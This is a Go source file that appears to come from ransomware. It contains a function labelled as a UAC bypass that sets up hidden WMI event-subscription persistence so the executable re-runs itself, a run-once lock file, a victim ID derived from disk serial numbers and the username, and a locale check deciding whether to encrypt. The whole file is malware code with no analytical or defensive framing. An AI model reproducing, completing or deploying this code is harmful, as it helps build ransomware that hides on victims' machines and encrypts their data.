package main

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/jaypipes/ghw"
	"github.com/jeandeaual/go-locale"
)

// var LockFileName = "g0_l4nG_1S_FuN_i5nT_1T.lock"
var VictimID string

// UAC Bypass + persistence.
// Provide path to current executable
func uacBypassPersist(path string) error {
	fPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	commands := []string{
		"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
		fmt.Sprintf("wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='GuacBypassConsumer', ExecutablePath='%s',CommandLineTemplate='%s'", fPath, fPath),
		"wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='GuacBypassFilter'', Consumer='CommandLineEventConsumer.Name='GuacBypassConsomer'')",
	}

	for _, command := range commands {
		cmd := NewCmd(command)
		cmd.Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if _, err := cmd.Exec.Output(); err != nil {
			return err
		}

		// Check for 1 second before command execution.
		time.Sleep(time.Second)
	}
	return nil
}

// creating run-once file
func create_lock_file(filename string) (*os.File, error) {
	if _, err := os.Stat(filename); err == nil {
		err = os.Remove(filename)
		if err != nil {
			return nil, err
		}

	}
	return os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_RDWR, 0666)
}

/* return (nil, false) if another instance is running
return (fileHandle, true) if no instance is running.

NOTE: Make sure to close and delete this file before exit.*/
func checkRunOnce(filename string) (*os.File, bool) {
	filePointer, err := create_lock_file(filename)

	if err != nil {
		// fmt.Println("someone is running")
		return nil, false
	}
	// filePointer, runOnceResult := checkRunOnce(LockFileName)
	// defer os.Remove(LockFileName) // defer executes backward
	// defer filePointer.Close()
	return filePointer, true
}

func generateVictimID() (string, error) {
	block, err := ghw.Block()
	if err != nil {
		return "", err
	}
	var victimID uint32 = 0
	for _, disk := range block.Disks {
		if victimID == 0 {
			victimID = crc32Checksum([]byte(disk.SerialNumber), 0xDEADBEEF)
		} else {
			victimID = crc32Checksum([]byte(disk.SerialNumber), victimID)
		}
	}
	user, err := user.Current()
	if err != nil {
		return "", err
	}
	victimID = crc32Checksum([]byte(user.Username), victimID)
	victimIDString := fmt.Sprintf("%08x", victimID)
	return strings.ToUpper(victimIDString), nil
}

// Check is false if language is not valid -> don't encrypt
func languageCheck() (bool, error) {
	userLocale, err := locale.GetLocale()
	if err != nil {
		return false, err
	}

	return userLocale != "en-US" && userLocale != "vi_VN", nil
}
